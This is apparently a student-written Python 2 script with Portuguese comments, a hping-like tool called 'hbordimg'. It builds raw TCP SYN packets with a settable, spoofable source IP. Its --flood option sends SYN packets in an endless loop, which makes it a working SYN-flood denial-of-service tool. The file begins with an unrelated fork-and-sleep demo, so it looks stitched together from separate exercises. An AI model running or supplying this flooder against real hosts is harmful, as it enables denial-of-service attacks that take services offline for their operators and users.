#coding: utf-8
from os import fork, getppid, wait
from sys import exit
from time import sleep
import socket, sys
import argparse
from time import sleep
from struct import *
from random import randint

#comando para ver processos: ps -eo pid,ppid,stat,cmd
#comando mais simples: top

pid = fork()
i = 0
if pid == 0:
    exit("Child: Goodbye, cruel world")
else:
    print "Parent: I created a child with pid", pid,\
          "and now all I want to do is sleep..."
    while i < 20:
        print "Caraio borracha"
        i += 1
        sleep(1)

# Funcoes auxiliares para calculo do checksum

def carry_around_add(a, b):
    c = a + b
    return (c & 0xffff) + (c >> 16)

def checksum(msg):
    s = 0
    if len(msg) % 2 != 0:
        msg += "\x00"
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i+1]) << 8)
        s = carry_around_add(s, w)
    return ~s & 0xffff


# Criacao de um RAW Socket
def cria_raw_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        return s
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # Para calculo do checksum tcp+ip, eh montado um cabecalho especial
    # Obs: ver em http://www.tcpipguide.com/free/t_TCPChecksumCalculationandtheTCPPseudoHeader-2.htm
def checksum_tcp(source_ip,dest_ip,tcp_header):

    # Campos do Pseudo-Cabecalho
    source_address = socket.inet_aton( source_ip )
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
    psh = psh + tcp_header;

    return checksum(psh)

def montaPacote(seqnumber,source_ip, dest_ip, source_port, dest_port, window_size, id):
    # Construcao do pacote
    packet = '';

    # IP's de origem e destino
    source_ip = source_ip
    dest_ip = dest_ip

    # ======== Campos do cabecalho IP ========

    # Tamanho do header (a ser calculado)
    ihl = 5

    # Versao do protocolo (IPv4)
    version = 4

    # Tipo de Servico
    tos = 0

    # Tamanho total (Python corrige no momento do envio)
    tot_len = 0

    # Identificador do pacote
    id = id

    # Offset Fragmentacao
    frag_off = 0

    # 'Time-to-live'
    ttl = 255

    # Protocolo utilizado (TCP)
    protocol = socket.IPPROTO_TCP

    # Checksum do header (Valor aleatorio p/ desabilitar validacao)
    check = 10

    # IP's de origem e destino.
    # inet_aton converte a notacao numeros-e-pontos em binario (network byte order)
    saddr = socket.inet_aton ( source_ip )
    daddr = socket.inet_aton ( dest_ip )

    # Calculo do tamanho do header. Ipv4 = 64 + ihl, Ipv6 = 96 + ihl
    ihl_version = (version << 4) + ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

    # ======== Campos do cabecalho TCP ========

    # Porta de origem
    source = source_port

    # Porta de destino
    dest = dest_port

    # Sequence Number
    seq = seqnumber

    # ACK Sequence
    ack_seq = 0

    # Data Offset
    doff = 5

    # Flags de controle
    fin = 0
    syn = 1  # Aqui ativamos a flag do SYN
    rst = 0
    psh = 0
    ack = 0
    urg = 0

    # Juncao das flags em apenas um numero binario
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    # Tamanho da janela (utilizando tamanho máximo permitido)
    # htons = host to network short
    window = socket.htons (window_size)

    # Checksum (a ser calculado)
    check = 0

    # Urgent Pointer (zero)
    urg_ptr = 0

    # Reservado
    offset_res = (doff << 4) + 0

    # the ! in the pack format string means network order
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

    # Cálculo do checksum do cabecalho TCP (no caso, do pseudo-cabecalho + header tcp)
    tcp_checksum = checksum_tcp(source_ip,dest_ip,tcp_header)

    # Repete o enpacotamento do cabecalho com o checksum calculado
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

    # Pacote final sao os dois headers, pois pacotes SYN nao possuem campo de dados
    packet = ip_header + tcp_header

    return packet
# ============================================================================================

# Obtenção do ip do cliente por meio de um socket dummy
dummy_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dummy_socket.connect(('google.com', 0))
local_ip =  dummy_socket.getsockname()[0]

# Leitura de argumentos da linha de comando

parser = argparse.ArgumentParser(description='Argumentos hbording')
parser.add_argument("--flood", help="Modo flooding",
                    action="store_true")
parser.add_argument('-q',"--quiet", help="Modo silencioso de output",
                    action="store_true")

# parser.add_argument("--rand-source", help="Ip origem randomico",
#                     action="store_true")


parser.add_argument('-d', action='store',
                    dest='dest_ip',
                    default='127.0.0.1',
                    required=True,
                    help='IP de destino. Default 127.0.0.1')

parser.add_argument('-s', action='store',
                    dest='source_ip',
                    default=local_ip,
                    help='IP de origem. Default is your local ip')

parser.add_argument('-c', action='store',
                    dest='c',
                    default=1,
                    type=int,
                    help='Numero de pacotes a enviar. Default 1')

parser.add_argument('-id', action='store',
                    dest='id',
                    default=54321,
                    type=int,
                    help='Id do pacote enviado. Default 54321')

parser.add_argument('-p', "--destport", action='store',
                    dest='dest_port',
                    default=80,
                    type=int,
                    help='Porta de destino. Default 80')

parser.add_argument('-sp', "--sourceport", action='store',
                    dest='source_port',
                    default=1234,
                    type=int,
                    help='Porta de origem. Default 1234')

parser.add_argument('-w', "--win", action='store',
                    dest='window_size',
                    default=5840,
                    type=int,
                    help='Tamanho da janela. Default 5840')

parser.add_argument('-i', "--interval", action='store',
                    dest='interval',
                    default=1,
                    type=int,
                    help='Intervalo de envio de pacotes (segundos). Default 1s')

parser.add_argument("-ui", "--uinterval", action='store',
                    dest='uinterval',
                    default=0,
                    type=int,
                    help='Intervalo de envio de pacotes (microsegundos).')


# Parse de argumentos de linha de comando
args = parser.parse_args()

# Cria o RAW Socket
s = cria_raw_socket()

# Avisa o kernel para nao adicionar headers automaticamente
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)


packet = montaPacote(0,args.source_ip, args.dest_ip, args.source_port, randint(1800,65533), args.window_size, args.id)

# Contadores do programa
pkt_counter = 0

# Escolha do modo

if args.flood:
    # Modo SYN FLOOD
    print "\n === hbordimg em modo flood, nao havera saida em tela ==="

    try:
    # Flood mode
        while(1):
            s.sendto(packet,(args.dest_ip,0))
            pkt_counter += 1
            packet = montaPacote(0,args.source_ip, args.dest_ip, randint(1800,65533), args.dest_port, args.window_size, args.id)

    except KeyboardInterrupt:
        # Fim do programa
        print ""
        print "--- %s hbordimg statistic ---" % args.dest_ip
        print "--- %d packets transmitted ---" % pkt_counter
        sys.exit()
else:
    # Modo normal, enviando 'c' pacotes
    if not args.quiet:
        print "HBORDIMG %s (interfacename %s)" % (args.dest_ip,args.source_ip)
    for x in range(0, args.c):
        sleep(args.interval)
        dest_port = randint(1800,65533)
        if not args.quiet:
            print "len=%d ip=%s dport=%d ttl=255 DF id=%d sport=%d flags=S seq=%d win=%d" % (len(packet),args.dest_ip,dest_port,args.id,args.source_port,pkt_counter,args.window_size)
        s.sendto(packet,(args.dest_ip, 0))
        packet = montaPacote(0,args.source_ip, args.dest_ip, args.source_port, dest_port, args.window_size, args.id)
        pkt_counter += 1

# Fim do programa
print ""
print "--- %s hbordimg statistic ---" % args.dest_ip
print "--- %d packets transmitted ---" % pkt_counter
